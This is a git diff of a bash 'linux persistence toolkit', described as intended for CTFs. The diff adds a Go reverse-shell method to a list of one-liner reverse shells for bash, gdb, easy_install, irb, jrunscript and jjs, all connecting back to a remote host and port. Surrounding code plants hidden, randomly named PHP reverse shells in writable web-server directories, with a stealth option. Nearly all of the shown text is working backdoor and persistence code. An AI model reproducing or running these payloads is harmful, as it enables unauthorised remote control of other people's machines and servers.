@@ -34,6 +34,7 @@ TMPPIPDIR=$(echo /dev/shm/$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | h
 TMPPIP3DIR=$(echo /dev/shm/$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n'))
 TMPRCLOCAL=$(echo /dev/shm/$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n'))
 TMPWEB=$(echo /dev/shm/$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n'))
+TMPGOFILE=$(echo /dev/shm/$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n').go)
 
 INFO="linux persistence toolkit\n\nadvisory: this was developed with ctfs in mind and that is its intended use case. please do not use this tool in an unethical or illegal manner.\n"
 
@@ -200,6 +201,7 @@ METHODS=(
     "bash , bash -c 'exit' , bash -c 'bash -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'?"
     "easy_install , mkdir /dev/shm/$TMPEASYINSTALLDIR && echo 'import sys,socket,os,pty;exit()' > /dev/shm/$TMPEASYINSTALLDIR/setup.py; easy_install /dev/shm/$TMPEASYINSTALLDIR 2> /dev/null &> /dev/null , mkdir /dev/shm/$TMPEASYINSTALLDIR; echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' > /dev/shm/$TMPEASYINSTALLDIR/setup.py; easy_install /dev/shm/$TMPEASYINSTALLDIR?"
     "gdb , gdb -nx -ex 'python import sys,socket,os,pty;exit()' &> /dev/null , echo 'c' | gdb -nx -ex 'python import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' -ex quit &> /dev/null?"
+    "go , echo 'package main;import\"os\";func main() { os.Exit(0) };' > $TMPGOFILE && go run $TMPGOFILE , echo 'package main;import\\\"os/exec\\\";import\\\"net\\\";func main(){c,_:=net.Dial(\\\"tcp\\\",\\\"$RHOST:$RPORT\\\");cmd:=exec.Command(\\\"$SHELL\\\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > $TMPGOFILE && go run $TMPGOFILE && $REMOVALTOOL $TMPGOFILE?"
     "irb , echo \\\"require 'socket'\\\" | irb --noecho --noverbose , echo \\\"require 'socket'; exit if fork;c=TCPSocket.new('$RHOST',$RPORT);while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read} end\\\" | irb --noecho --noverbose?"
     "jrunscript , jrunscript -e 'exit();' , jrunscript -e 'var host=\\\"$RHOST\\\"; var port=$RPORT;var p=new java.lang.ProcessBuilder(\\\"$SHELL\\\", \\\"-i\\\").redirectErrorStream(true).start();var s=new java.net.Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50);try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'?"
     "jjs , echo \"quit()\" > $TMPJJSFILE && jjs $TMPJJSFILE , echo 'var ProcessBuilder = Java.type(\\\"java.lang.ProcessBuilder\\\");var p=new ProcessBuilder(\\\"$SHELL\\\", \\\"-i\\\").redirectErrorStream(true).start();var Socket = Java.type(\\\"java.net.Socket\\\");var s=new Socket(\\\"$RHOST\\\",$RPORT);var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\\\"java.lang.Thread\\\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs?" 
@@ -301,26 +303,21 @@ webserver_poison_attack() {
 	    for i in $(find $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') -writable -type d);
 	    do
 		echo -e "\e[92m[+]\e[0m Directory Found: $i"
-
 		if [ $DRYRUN -eq 0 ];
 		then
 		    IFS="?"
-
 		    for s in ${METHODS[@]};
 		    do
 			METHOD=$(echo $s | awk -F ' , ' '{print $1}')
 			PAYLOAD=$(echo $s | awk -F ' , ' '{print $3}')
-
 			if $(echo $METHOD | grep -qi "php");
 			then	
 			    unset IFS
 			    RANDOMPHPFILE=$(echo $(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n').php)
-
 			    if [ "$STEALTHMODE" -eq 1 ];
 			    then
 				RANDOMPHPFILE=$(echo .$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head -n 10 | tr -d '\n').php)
 			    fi
-
 			    PAYLOAD="<?php exec(\"$SHELL -c '$SHELL -i >& /dev/tcp/$RHOST/$RPORT 0>&1'\"); ?>"
 			    echo $PAYLOAD > $i/$RANDOMPHPFILE && echo -e "\e[92m[+]\e[0m Persistence Installed: PHP Reverse Shell $i/$RANDOMPHPFILE" && COUNTER=$(expr $COUNTER + 1) && limit_checker $COUNTER
 			    IFS="?"
@@ -456,7 +453,6 @@ cleanup() {
     cd $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}'); grep -R --color=never "$1" . | awk -F: '{print $1}' | xargs $REMOVALTOOL 2> /dev/null &> /dev/null && echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}')/*"
 
 }
-
 
 enum_defenses() {
 
